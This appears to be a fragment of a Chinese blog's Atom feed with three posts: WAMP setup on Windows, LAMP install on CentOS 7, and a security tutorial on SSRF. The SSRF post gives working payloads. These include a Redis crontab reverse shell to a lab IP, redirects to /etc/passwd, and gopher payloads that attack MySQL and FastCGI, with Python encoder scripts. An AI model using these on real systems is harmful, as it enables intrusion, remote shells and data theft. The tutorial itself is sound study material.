    <updated>2020-02-26T07:15:03.980Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h1><p>window2012</p><p>php-5.6.20-Win32-VC11-x64.zip</p><p>httpd-2.4.18-x64-vc11-r3.zip</p><p>vcredist_x64.exe</p><p>mysql-5.7.11-winx64.zip</p><h1 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h1><ul><li>安装vcredist_x64.exe</li><li>解压apache httpd，php，mysql到D:\wamp</li><li>创建默认站点目录D:\wamp\www</li><li>创建数据库data目录D:\wamp\mydata</li></ul><h2 id="apache-httpd设置"><a href="#apache-httpd设置" class="headerlink" title="apache httpd设置"></a>apache httpd设置</h2><ol><li><p><strong>添加环境变量</strong></p><p>将httpd安装目录下的bin路径添加到Path变量，这里是D:\wamp\Apache24\bin</p></li><li><p>修改httpd配置文件  D:\wamp\Apache24\conf\httpd.conf</p><ul><li><p>修改SRVROOT指向到安装目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Define SRVROOT &quot;D:&#x2F;wamp&#x2F;Apache24&quot;</span><br></pre></td></tr></table></figure></li><li><p>PHP集成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># PHP 5</span><br><span class="line">LoadModule php5_module &quot;D:&#x2F;wamp&#x2F;php&#x2F;php5apache2_4.dll&quot;</span><br><span class="line">AddType application&#x2F;x-httpd-php .php</span><br><span class="line"># configure the path to php.ini</span><br><span class="line">PHPIniDir &quot;D:&#x2F;wamp&#x2F;php&quot;</span><br></pre></td></tr></table></figure></li><li><p>添加index.php为默认文档</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DirectoryIndex index.php index.html</span><br></pre></td></tr></table></figure></li></ul></li></ol><h3 id="多端口站点配置"><a href="#多端口站点配置" class="headerlink" title="多端口站点配置"></a>多端口站点配置</h3><ol><li><p>添加多端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Listen 80</span><br><span class="line">Listen 8081</span><br></pre></td></tr></table></figure></li><li><p>添加多端口站点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># Virtual Hosts</span><br><span class="line">&lt;VirtualHost *:8081&gt;</span><br><span class="line">    DocumentRoot &quot;D:&#x2F;wamp&#x2F;www&#x2F;site1&quot;</span><br><span class="line">    ServerName localhost</span><br><span class="line">    ErrorLog &quot;logs&#x2F;site1-error.log&quot;</span><br><span class="line">    CustomLog &quot;logs&#x2F;site1-access.log&quot; common</span><br><span class="line">    &lt;Directory &quot;D:&#x2F;wamp&#x2F;www&#x2F;site1&quot;&gt;</span><br><span class="line">        Options FollowSymLinks</span><br><span class="line">        AllowOverride None</span><br><span class="line">        Require all granted</span><br><span class="line">    &lt;&#x2F;Directory&gt;</span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br></pre></td></tr></table></figure></li></ol><h3 id="多域名站点配置"><a href="#多域名站点配置" class="headerlink" title="多域名站点配置"></a>多域名站点配置</h3><ol><li><p>添加域名映射到C:\Windows\System32\drivers\etc\hosts文件中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1      site1.example.com</span><br></pre></td></tr></table></figure></li><li><p>添加多域名站点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    DocumentRoot &quot;D:&#x2F;wamp&#x2F;www&#x2F;site1&quot;</span><br><span class="line">    ServerName site1.example.com</span><br><span class="line">    ErrorLog &quot;logs&#x2F;site1-error.log&quot;</span><br><span class="line">    CustomLog &quot;logs&#x2F;site1-access.log&quot; common</span><br><span class="line">    &lt;Directory &quot;D:&#x2F;wamp&#x2F;www&#x2F;site1&quot;&gt;</span><br><span class="line">        Options FollowSymLinks</span><br><span class="line">        AllowOverride None</span><br><span class="line">        Require all granted</span><br><span class="line">    &lt;&#x2F;Directory&gt;</span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br></pre></td></tr></table></figure></li><li><p>创建站点目录D:/wamp/www/site1</p></li><li><p>创建首页D:/wamp/www/site1/index.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li></ol><p>把Apache httpd安装成后台服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpd -k install</span><br></pre></td></tr></table></figure><p>设置开机自启动ApacheMonitor程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将D:&#x2F;wamp&#x2F;Apache24\bin\ApacheMonitor.exe拷贝到C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp中</span><br></pre></td></tr></table></figure><p>启动apache httpd服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpd -k start</span><br></pre></td></tr></table></figure><h2 id="php设置"><a href="#php设置" class="headerlink" title="php设置"></a>php设置</h2><ol><li><p>添加环境变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将php安装路径添加到Path变量，这里是D:\wamp\php</span><br></pre></td></tr></table></figure></li><li><p>进入PHP安装目录，找到 <code>php.ini-development（生产环境用php.ini-production）</code> 文件并复制一份到当前目录，重命名为 <code>php.ini</code></p></li><li><p>修改php配置文件php.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修改ext文件夹的路径（extension_dir&#x3D;&quot;D:&#x2F;wamp&#x2F;php&#x2F;ext&quot;）</span><br></pre></td></tr></table></figure></li><li><p>要在 php.ini 中启用某扩展库，需要去掉该行 <em>extension=php_\</em>.dll* 前的注释符号，这里需要启用 php_mbstring，php_openssl 扩展库</p></li></ol><h2 id="开通Windows防火墙"><a href="#开通Windows防火墙" class="headerlink" title="开通Windows防火墙"></a>开通Windows防火墙</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name&#x3D;WebServer dir&#x3D;in action&#x3D;allow protocol&#x3D;TCP localport&#x3D;80,443,8080-8090</span><br></pre></td></tr></table></figure><h2 id="安装MySQL"><a href="#安装MySQL" class="headerlink" title="安装MySQL"></a>安装MySQL</h2><ol><li><p>进入mysql安装目录，找到 my-default.ini，重命名为 my.ini``</p></li><li><p>修改mysql配置文件my.ini</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">basedir &#x3D; D:&#x2F;wamp&#x2F;mysql</span><br><span class="line">datadir &#x3D; D:&#x2F;wamp&#x2F;mydata</span><br><span class="line">port &#x3D; 3306</span><br></pre></td></tr></table></figure></li><li><p>打开命令行窗口，执行以下命令来安装并启动mysql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;d D:\wamp\mysql</span><br><span class="line">bin\mysqld --initialize-insecure</span><br><span class="line">bin\mysqld --install</span><br><span class="line">NET START MySQL</span><br></pre></td></tr></table></figure></li><li><p>输入以下命令执行mysql的安全设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin\mysql_secure_installation</span><br></pre></td></tr></table></figure></li><li><p>将D:\wamp\mysql\bin添加到PATH环境变量</p></li><li><p>之后就可以在命令行窗口直接输入以下命令进入mysql控制台</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;环境介绍&quot;&gt;&lt;a href=&quot;#环境介绍&quot; class=&quot;headerlink&quot; title=&quot;环境介绍&quot;&gt;&lt;/a&gt;环境介绍&lt;/h1&gt;&lt;p&gt;window2012&lt;/p&gt;
&lt;p&gt;php-5.6.20-Win32-VC11-x64.zip&lt;/p&gt;
&lt;p&gt;httpd-2
      
    
    </summary>
    
    
      <category term="服务搭建" scheme="http://yoursite.com/categories/%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/"/>
    
    
      <category term="http服务" scheme="http://yoursite.com/tags/http%E6%9C%8D%E5%8A%A1/"/>
    
  </entry>
  
  <entry>
    <title>LAMP安装</title>
    <link href="http://yoursite.com/2020/02/26/LAMP%E5%AE%89%E8%A3%85/"/>
    <id>http://yoursite.com/2020/02/26/LAMP%E5%AE%89%E8%A3%85/</id>
    <published>2020-02-26T05:57:56.000Z</published>
    <updated>2020-02-27T09:11:57.640Z</updated>
    
    <content type="html"><![CDATA[<h1 id="centos7安装LAMP"><a href="#centos7安装LAMP" class="headerlink" title="centos7安装LAMP"></a>centos7安装LAMP</h1><ol><li><p>安装apache</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install httpd</span><br></pre></td></tr></table></figure></li><li><p>安装apache扩展</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install httpd-manual mod_ssl mod_perl mod_auth_mysql</span><br></pre></td></tr></table></figure></li><li><p>启动apache</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl start httpd.service #启动apache</span><br><span class="line">systemctl stop httpd.service #停止</span><br><span class="line">systemctl restart httpd.service #重启</span><br></pre></td></tr></table></figure></li><li><p>设置开机自启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable httpd.service</span><br></pre></td></tr></table></figure></li><li><p>安装php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install php</span><br></pre></td></tr></table></figure></li><li><p>安装php-fpm</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install php-fpm</span><br></pre></td></tr></table></figure></li><li><p>安装php扩展</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install php-gd php-xml php-mbstring php-ldap php-pear php-xmlrpc php-devel</span><br></pre></td></tr></table></figure></li><li><p>安装mysql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install mariadb-servie</span><br></pre></td></tr></table></figure></li><li><p>安装php-mysql </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install php-mysql</span><br></pre></td></tr></table></figure></li><li><p>安装mysql扩展</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install mysql-connector-odbc libdbi-dbd-mysql mysql-devel</span><br></pre></td></tr></table></figure></li><li><p>启动mysql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl strat mariadb.service #启动 </span><br><span class="line">systemctl stop mariadb.service </span><br><span class="line">systemctl restrat mariadb.service</span><br></pre></td></tr></table></figure></li><li><p>设置开启自启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl enable mariadb.service</span><br></pre></td></tr></table></figure></li><li><p>配置mysql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_secure_installation</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;centos7安装LAMP&quot;&gt;&lt;a href=&quot;#centos7安装LAMP&quot; class=&quot;headerlink&quot; title=&quot;centos7安装LAMP&quot;&gt;&lt;/a&gt;centos7安装LAMP&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;安装apache&lt;/p&gt;
&lt;fig
      
    
    </summary>
    
    
      <category term="服务搭建" scheme="http://yoursite.com/categories/%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/"/>
    
    
      <category term="http服务" scheme="http://yoursite.com/tags/http%E6%9C%8D%E5%8A%A1/"/>
    
  </entry>
  
  <entry>
    <title>SSRF漏洞</title>
    <link href="http://yoursite.com/2020/02/26/SSRF%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2020/02/26/SSRF%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-02-26T05:22:09.000Z</published>
    <updated>2020-02-26T13:38:44.086Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-SSRF简介"><a href="#1-SSRF简介" class="headerlink" title="1 SSRF简介"></a>1 SSRF简介</h1><p>SSRF(Server-Side Request Forgery)，服务器端请求伪造，利用漏洞伪造服务器端发起请求，攻击的目标是外网无法访问的内部系统，从而突破客户端获取不到数据限制。就是利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务。</p><p>如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;google.com&#x2F; HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">Host: example.com</span><br></pre></td></tr></table></figure><p>在这里，<a href="http://example.com从它的服务器获取http://google.com" target="_blank" rel="noopener">http://example.com从它的服务器获取http://google.com</a></p><p><img src="/picture/17/1.jpg" alt=""></p><h1 id="SSRF的类型"><a href="#SSRF的类型" class="headerlink" title="SSRF的类型"></a>SSRF的类型</h1><ol><li>显示攻击者的响应（Basic）</li><li>不显示响应（Blind）</li></ol><h1 id="最常用的跳转绕过"><a href="#最常用的跳转绕过" class="headerlink" title="最常用的跳转绕过"></a>最常用的跳转绕过</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Location: file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;)</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Location: dict:&#x2F;&#x2F;127.0.0.1:666&#x2F;info&quot;)</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Location: gopher:&#x2F;&#x2F;127.0.0.1:666&#x2F;info&quot;)</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="SSRF漏洞的危害"><a href="#SSRF漏洞的危害" class="headerlink" title="SSRF漏洞的危害"></a>SSRF漏洞的危害</h1><ol><li>对服务器所在的内网进行端口扫描，获取一些服务的banner信息等</li><li>攻击运行在内网或者本地的应用程序</li><li>对内网WEB应用进行指纹识别，通过访问默认文件实现（Readme等文件）</li><li>攻击内外网的WEB应用，主要是GET就可以实现的攻击（比如Struts2，SQL注入等）</li><li>下载内网资源（利用file协议读取本地文件等）</li><li>利用Redis未授权访问，HTTP CRLF注入达到getshell</li><li>进行跳板</li><li>无视cdn</li></ol><h1 id="漏洞常见出现位置"><a href="#漏洞常见出现位置" class="headerlink" title="漏洞常见出现位置"></a>漏洞常见出现位置</h1><ol><li>云服务器商。(各种网站数据库操作)</li><li>有远程图片加载的地方。(编辑器之类的有远程图片加载啊)</li><li>网站采集、网页抓取的地方。(很多网站会有新闻采集输入url然后一键采集)</li><li>头像的地方。(如远程加载头像，例如:<a href="http://www.xxxx.com/image?url=http://www.image.com/1.jpg" target="_blank" rel="noopener">http://www.xxxx.com/image?url=http://www.image.com/1.jpg</a>)</li><li>要输入网址的地方和可以输入ip的都放，都是ssrf的天下。</li></ol><h1 id="SSRF神器Curl的使用"><a href="#SSRF神器Curl的使用" class="headerlink" title="SSRF神器Curl的使用"></a>SSRF神器Curl的使用</h1><p>查看curl支持的协议列表 #curl–config –protocols</p><ul><li><p>使用curl读取文件 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure></li><li><p>使用ftp协议 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &quot;ftp:&#x2F;&#x2F;127.0.0.1:6666&#x2F;info&quot;</span><br></pre></td></tr></table></figure></li><li><p>使用dict协议 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &quot;dict:&#x2F;&#x2F;127.0.0.1:6666&#x2F;info&quot;</span><br></pre></td></tr></table></figure></li><li><p>使用gopher协议 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &quot;gopher:&#x2F;&#x2F;127.0.0.1:6666&#x2F;_info&quot;</span><br></pre></td></tr></table></figure></li></ul><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="weblogic-ssrf攻击redis"><a href="#weblogic-ssrf攻击redis" class="headerlink" title="weblogic ssrf攻击redis"></a>weblogic ssrf攻击redis</h2><ol><li><p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进一步实现端口探测。该漏洞存在于/uddiexplorer/SearchPublicRegistries.jsp，我们使用burpsuite访问如下url进行测试。</p><ul><li><p>可访问的端口，一般返回<strong>error code</strong></p><p><img src="/picture/17/2.png" alt=""></p></li><li><p>访问非http协议，一般返回<strong>did not have a valid SOAP content-type</strong></p><p><img src="/picture/17/3.png" alt=""></p></li><li><p>端口关闭，一般返回<strong>could not connect over HTTP to server</strong></p><p><img src="/picture/17/4.png" alt=""></p></li></ul></li><li><p>Weblogic SSRF支持通过crlf注入的方式来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。</p><ul><li><p>发送如下3条命令，写入定时任务反弹shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.18.0.1&#x2F;21 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir &#x2F;etc&#x2F;</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br></pre></td></tr></table></figure></li></ul></li></ol><ul><li><p>进行url编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</span><br></pre></td></tr></table></figure></li><li><p>通过如下链接发送出去，nc监听端口，可成功getshell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.88.152:7001&#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;172.18.0.3:6379&#x2F;test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</span><br></pre></td></tr></table></figure></li></ul><h2 id="结合gopher协议实现进一步攻击"><a href="#结合gopher协议实现进一步攻击" class="headerlink" title="结合gopher协议实现进一步攻击"></a>结合gopher协议实现进一步攻击</h2><p>   SSRF主要是使用get请求，攻击不需要授权的应用，但是如果目标站点支持gopher协议，就可以扩大我们的攻击面。Gopher 协议是 HTTP 协议出现之前，在 Internet 上常用的一个协议，利用此协议可以构造GET、POST 请求，攻击内网中的redis、fastcgi、mysql等。</p><h3 id="gopher攻击MySQL"><a href="#gopher攻击MySQL" class="headerlink" title="gopher攻击MySQL"></a>gopher攻击MySQL</h3><p>   MySQL有密码和无密码的认证方式不一样，无密码认证时直接发送TCP/IP数据包即可访问。如果内网中的mysql数据库存在无密码的用户，可结合gopher协议进行攻击。</p><ol><li><p>首先使用tcpdump监听3306端口。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump port 3306 -w mysql.pcapng</span><br></pre></td></tr></table></figure></li><li><p>然后开启MySQL终端，查询一些信息，最后记得exit退出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h192.168.40.155 -uusernopass</span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p>使用wireshark打开mysql.pcapng，随便选一个包，追踪TCP流，提取request包的原始数据。</p></li><li><p>把原始数据保存成一行，然后使用如下脚本进行编码，得到payload。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#encoding:utf-8</span><br><span class="line"></span><br><span class="line">def result(s):</span><br><span class="line">    a&#x3D;[s[i:i+2] for i in xrange(0,len(s),2)]</span><br><span class="line">    return &quot;curl gopher:&#x2F;&#x2F;192.168.40.155:3306&#x2F;_%&quot; + &quot;%&quot;.join(a)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    import sys</span><br><span class="line">    s&#x3D;sys.argv[1]</span><br><span class="line">    print result(s)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python mysql_gopher.py 4200000185a63f20000000012d0000000000000000000000000000000000000000000000757365726e6f7061737300006d7973716c5f6e61746976655f70617373776f726400210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d697420310f0000000373686f77206461746162617365730100000001</span><br></pre></td></tr></table></figure></li><li><p>使用curl命令发送payload，并将输出结果保存成mysql.txt。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher:&#x2F;&#x2F;192.168.40.155:3306&#x2F;_%42%00%00%01%85%a6%3f%20%00%00%00%01%2d%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%75%73%65%72%6e%6f%70%61%73%73%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%21%00%00%00%03%73%65%6c%65%63%74%20%40%40%76%65%72%73%69%6f%6e%5f%63%6f%6d%6d%65%6e%74%20%6c%69%6d%69%74%20%31%0f%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%01%00%00%00%01 --output - &gt; mysql.txt</span><br></pre></td></tr></table></figure></li><li><p>使用strings命令读取mysql.txt，获得输出结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings mysql.txt</span><br></pre></td></tr></table></figure><h3 id="gopher攻击fastcgi"><a href="#gopher攻击fastcgi" class="headerlink" title="gopher攻击fastcgi"></a>gopher攻击fastcgi</h3><p>php-fpm一般监听在127.0.0.1的9000端口上，当存在未授权访问漏洞时，利用 Gopher+SSRF 可以完美攻击 FastCGI 执行任意命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">前提条件：</span><br><span class="line">PHP-FPM监听端口</span><br><span class="line">PHP-FPM版本 &gt;&#x3D; 5.3.3</span><br><span class="line">libcurl版本&gt;&#x3D;7.45.0(curl版本小于7.45.0时，gopher的%00会被截断)</span><br><span class="line">知道服务器上任意一个php文件的绝对路径，例如&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;PEAR.php</span><br></pre></td></tr></table></figure></li></ol><ol><li><p>首先监听2333端口的流量，并将输出保存成1.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvvlp 2333 &gt; 1.txt</span><br></pre></td></tr></table></figure></li><li><p>执行fpm.py，得到poc代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fpm.py 127.0.0.1 &#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;PEAR.php -c &#39;&lt;?php echo &#96;id&#96;; exit;?&gt;&#39; -p 2333</span><br></pre></td></tr></table></figure></li><li><p>使用如下脚本，将poc代码进行编码，得到gopher攻击的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">def go():</span><br><span class="line">    f &#x3D; open(&quot;1.txt&quot;)</span><br><span class="line">    content &#x3D; f.read()</span><br><span class="line">    print urllib.quote(content)</span><br><span class="line"> </span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    go()</span><br></pre></td></tr></table></figure></li><li><p>使用curl命令发送payload，成功执行了系统命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &quot;gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%01%01%96%A2%00%08%00%00%00%01%00%00%00%00%00%00%01%04%96%A2%01%E7%00%00%0E%02CONTENT_LENGTH24%0C%10CONTENT_TYPEapplication&#x2F;text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI&#x2F;1.0%0F%0ESERVER_SOFTWAREphp&#x2F;fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%1BSCRIPT_FILENAME&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;PEAR.php%0B%1BSCRIPT_NAME&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;PEAR.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT&#x2F;%0B%09SERVER_ADDR127.0.0.1%0B%1BREQUEST_URI&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;PEAR.php%01%04%96%A2%00%00%00%00%01%05%96%A2%00%18%00%00%3C%3Fphp%20echo%20%60id%60%3B%20exit%3B%3F%3E%01%05%96%A2%00%00%00%00&quot;</span><br></pre></td></tr></table></figure></li></ol><h3 